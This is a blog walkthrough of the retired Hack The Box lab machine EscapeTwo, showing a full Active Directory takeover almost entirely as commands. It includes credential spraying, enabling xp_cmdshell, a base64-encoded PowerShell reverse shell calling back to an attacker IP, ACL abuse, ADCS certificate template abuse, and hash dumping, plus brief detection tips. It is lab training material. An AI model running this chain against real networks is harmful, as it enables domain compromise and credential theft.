---
title: "Assumed Breach to Domain Admin - HTB EscapeTwo Walkthrough"
date: 2025-06-15 10:10:00 +0700
categories: [Active-directory]
tags: [AD, Assumed Breach, HTB, MSSQL, SMB, Red Teaming, ADCS, ShadowCreds, BloodHound]
toc: true
pin: false
---

# Assumed Breach to Domain Admin – HTB EscapeTwo Walkthrough

This post demonstrates a full-path Active Directory compromise using initial credentials, misconfigured services, and post-exploitation techniques. Based on the retired [HTB EscapeTwo](https://app.hackthebox.com/machines/EscapeTwo) machine.

## 🧠 Adversary Tradecraft Timeline

| Phase            | Tool/Action                    | Outcome                          |
| ---------------- | ------------------------------ | -------------------------------- |
| Initial Access   | Valid user credentials (rose)  | Confirmed domain access          |
| Recon            | MSSQL + SMB enumeration        | Found Excel creds via shares     |
| Credential Abuse | Used leaked `sa` password      | Gained privileged SQL shell      |
| Privesc          | Enabled `xp_cmdshell`          | `sql_svc` user shell             |
| Internal Recon   | BloodHound + ldapdomaindump    | Identified ADCS misconfig (ESC4) |
| Lateral Movement | OwnerEdit + DACL + ShadowCreds | Took over `ca_svc`               |
| Full Compromise  | ADCS abuse → cert + PFX login  | WinRM as Administrator           |

## 🔐 Initial Credentials

```bash
Username: rose
Password: KxEPkKe6R8su
```

```bash
echo -e "rose\nKxEPkKe6R8su" > creds.txt
```

## 🔍 Network Scanning

```bash
sudo nmap -p- --min-rate 10000 -sCV -Pn -oN enum.nmap 10.10.11.51
```

## 🧪 Protocol Enumeration (NetExec)

```bash
for p in smb vnc rdp ssh ftp nfs wmi winrm mssql ldap; do netexec $p 10.10.11.51 -u rose -p 'KxEPkKe6R8su'; done
```

Result:

```
SMB 10.10.11.51 445 DC01 [+] sequel.htb\rose:KxEPkKe6R8su
```

## 📁 SMB Share Access

```bash
netexec smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares
smbclient '//dc01.sequel.htb/Accounting Department' -U rose%KxEPkKe6R8su
prompt off
mget *
```

Discovered: `accounts.xlsx`

## 📊 Parse Excel File

```bash
unzip accounts.xlsx -d accounts
cat accounts/xl/sharedStrings.xml | xmllint --xpath '//*[local-name()="t"]/text()' - | awk 'ORS=NR%5?",":"\n"' > userpass.txt
cut -d',' -f4 userpass.txt > users
cut -d',' -f5 userpass.txt > passwords
```

Sample:

```
Angela,Martin,angela@sequel.htb,angela,0fwz7Q4mSpurIt99
Oscar,Martinez,oscar@sequel.htb,oscar,86LxLBMgEWaKUnBG
Kevin,Malone,kevin@sequel.htb,kevin,Md9Wlq1E5bZnVDVo
NULL,sa@sequel.htb,sa,MSSQLP@ssw0rd!,
```

## 🧪 Credential Spraying

```bash
netexec smb sequel.htb -u users -p passwords --continue-on-success
netexec mssql sequel.htb -u users -p passwords --continue-on-success --local-auth
```

Found:

```
DC01\sa : MSSQLP@ssw0rd!
```

## 🛠️ Privileged MSSQL Shell

```bash
impacket-mssqlclient 'sa':'MSSQLP@ssw0rd!'@sequel.htb
```

Enable cmd exec:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## 👚 Reverse Shell (via HoaxShell)

```bash
git clone https://github.com/t3l3machus/hoaxshell
cd hoaxshell
sudo pip3 install -r requirements.txt
chmod +x hoaxshell.py
sudo python3 hoaxshell.py -s 10.10.14.12
```

On MSSQL:

```sql
EXEC xp_cmdshell "powershell -enc JABzAD0AJwAxADAALgAxADAALgAxADQALgAxADIAOgA4ADAAOAAwACcAOwAkAGkAPQAnAGIAZAAxADIAOABlAGUANgAtAGYANQBkADQANgAzAGYAZQAtAGIAYwA5ADIAZgBiADEAMwAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwBiAGQAMQAyADgAZQBlADYAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0ANgBjADIAYgAtAGIANQAyADQAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZgA1AGQANAA2ADMAZgBlACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAYwAyAGIALQBiADUAMgA0ACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvAGIAYwA5ADIAZgBiADEAMwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADYAYwAyAGIALQBiADUAMgA0ACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA="
```

## 🧠 AD Recon (BloodHound)

```bash
ldapdomaindump ldap://dc01.sequel.htb -u sequel.htb\\rose -p 'KxEPkKe6R8su'
bloodhound-python -u rose -p 'KxEPkKe6R8su' -d sequel.htb -c all
```

PowerShell check for ACL:

```powershell
$u="SEQUEL\ryan";Get-ADUser -Filter *|%{$dn="AD:$($_.DistinguishedName)";$a=Get-Acl $dn;$h=$a.Access|?{$_.IdentityReference -eq $u -and $_.ActiveDirectoryRights -match 'WriteOwner|GenericAll|GenericWrite|All'};if($h){Write-Host "User: $($_.Name)" -ForegroundColor Cyan;$h|fl;Write-Host "-----" -ForegroundColor DarkGray}}
```

## 🏗️ Takeover ca_svc via ACL Abuse

```bash
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' sequel.htb/ryan:'WqSZAF6CysDQbGb3'
impacket-dacledit -action write -rights FullControl -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:'WqSZAF6CysDQbGb3'
net rpc password "ca_svc" "w1ldP@ssword2022" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "sequel.htb"
```

## ⚙️ ADCS Abuse (ESC1 / ESC4)

```bash
certipy-ad find -u ca_svc -p w1ldP@ssword2022 -dc-ip 10.10.11.51 -vulnerable
certipy-ad template -template DunderMifflinAuthentication -u ca_svc -p 'w1ldP@ssword2022' -dc-ip 10.10.11.51
certipy-ad req -u ca_svc -p w1ldP@ssword2022 -target sequel.htb -dns sequel.htb -ca sequel-dc01-ca -upn Administrator -template DunderMifflinAuthentication
```

## 🔐 Use Certificate to Authenticate & Dump Hashes

```bash
certipy-ad auth -pfx administrator_sequel.pfx -username Administrator -domain sequel.htb
secretsdump.py -k -no-pass -just-dc sequel.htb/Administrator@sequel.htb
```

## 🪟 Admin Shell (WinRM)

```bash
netexec winrm sequel.htb -u Administrator -H <NTLM_HASH>
```

## 🔍 Blue Team Detection Tips

- Alert on `xp_cmdshell` usage or configuration
- Monitor certificate enrollments for abnormal usage
- Audit owner/DACL modifications to sensitive objects
- Harden and audit ADCS templates regularly (ESC1–ESC8)

## ✅ Summary

| Phase             | Tactic                                 |
| ----------------- | --------------------------------------- |
| Initial Access    | SMB login with `rose`                  |
| Recon             | Excel creds + BloodHound               |
| Privilege Esc     | `sa` → `xp_cmdshell`                   |
| ACL Abuse         | `ryan` takeover of `ca_svc`            |
| ADCS Exploit      | ESC1 / ESC4 → cert for Administrator   |
| Domain Takeover   | WinRM + `netexec` as Domain Admin      |

---

This walkthrough showcases a realistic assumed breach scenario using tools like BloodHound, Certipy, and Impacket to compromise a full AD forest. Ideal for red teamers testing post-exploitation, and blue teamers hunting TTPs.
